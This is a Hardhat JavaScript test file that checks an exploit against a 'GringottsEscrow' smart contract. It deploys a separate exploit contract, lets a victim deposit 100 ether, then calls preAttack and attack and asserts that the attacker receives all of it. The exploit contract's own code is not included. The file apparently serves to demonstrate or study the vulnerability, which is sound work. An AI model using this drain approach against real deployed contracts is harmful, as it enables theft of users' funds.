const { ethers } = require('hardhat');
const { expect } = require('chai');
const { BigNumber } = require('ethers');
const { utils } = ethers;

describe('GringottsEscrow', function () {
  let GringottsEscrow;
  let hardhatGringottsEscrow;
  let addr1, addr2;
  let lastestBlock;

  let secret;
  let anotherSecretHash;

  beforeEach(async () => {
    GringottsEscrow = await ethers.getContractFactory('GringottsEscrow');
    hardhatGringottsEscrow = await GringottsEscrow.deploy();

    secret = 'secret';
    anotherSecretHash = utils.keccak256(
      utils.solidityPack(
        ['string', 'address'],
        ['anotherSecret', hardhatGringottsEscrow.address.toLowerCase()],
      ),
    );

    GringottsEscrowExploit = await ethers.getContractFactory(
      'GringottsEscrowExploit',
    );
    [addr1, addr2] = await ethers.getSigners();

    hardhatGringottsEscrowExploit = await GringottsEscrowExploit.deploy(
      hardhatGringottsEscrow.address,
      secret,
    );
    lastestBlock = await ethers.provider.getBlock('latest');
  });

  describe('deposit', () => {
    it('should be able to still all ether from contract', async () => {
      await hardhatGringottsEscrow
        .connect(addr2)
        .deposit(anotherSecretHash, lastestBlock.timestamp + 3600, {
          value: ethers.utils.parseEther('100'),
        });

      const startBalance = await addr1.getBalance();

      const preAttackTx = await hardhatGringottsEscrowExploit
        .connect(addr1)
        .preAttack({
          value: ethers.utils.parseEther('1'),
        });
      preAttackTx.receipt = await preAttackTx.wait();

      await network.provider.send('evm_increaseTime', [3700]);

      const attackTx = await hardhatGringottsEscrowExploit
        .connect(addr1)
        .attack();
      attackTx.receipt = await attackTx.wait();

      expect(await addr1.getBalance()).to.be.equal(
        startBalance
          .add(ethers.utils.parseEther('100'))
          .sub(preAttackTx.receipt.gasUsed)
          .sub(attackTx.receipt.gasUsed),
      );
    });
  });
});
